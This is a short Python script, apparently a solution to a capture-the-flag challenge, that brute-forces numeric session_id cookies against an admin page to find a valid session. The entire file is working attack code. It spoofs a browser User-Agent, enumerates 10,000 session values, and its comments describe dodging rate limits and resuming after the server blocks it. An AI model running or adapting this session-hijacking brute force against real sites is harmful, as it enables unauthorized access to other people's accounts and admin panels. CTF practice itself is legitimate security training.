import requests
import sys
import time

TARGET_URL = "http://too-small-reminder.challs.olicyber.it/admin"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Connection": "keep-alive"
}

def brute_force_sessions():
    print(f"[*] Starting session brute-force against {TARGET_URL}")
    
    # 1. Use a Session object to reuse the same TCP connection
    session = requests.Session()
    session.headers.update(HEADERS)
    
    for session_val in range(1, 10001):
        cookies = {
            "session_id": str(session_val)
        }
        
        try:
            # 2. Increase the timeout slightly just in case the server is slow
            response = session.get(TARGET_URL, cookies=cookies, timeout=5)
            
            sys.stdout.write(f"\rTesting session_id: {session_val} | Status: {response.status_code}")
            sys.stdout.flush()
            
            # Look for a 200 OK (Assuming invalid sessions return 401 or 302)
            if response.status_code == 200:
                print(f"\n[+] SUCCESS! Valid session found: {session_val}")
                print(f"[+] Response Length: {len(response.text)} bytes")
                break
            
            # 3. Add a small delay (e.g., 50 milliseconds) to avoid rate limits
            #time.sleep(0.05) 
            
        except requests.exceptions.RequestException as e:
            print(f"\n[!] Connection dropped at session {session_val}.")
            print("[-] The server is likely blocking you. Wait a few minutes and try increasing time.sleep()")
            break

if __name__ == "__main__":
    # If resuming after a crash, change the range() in the loop to start at 291
    brute_force_sessions()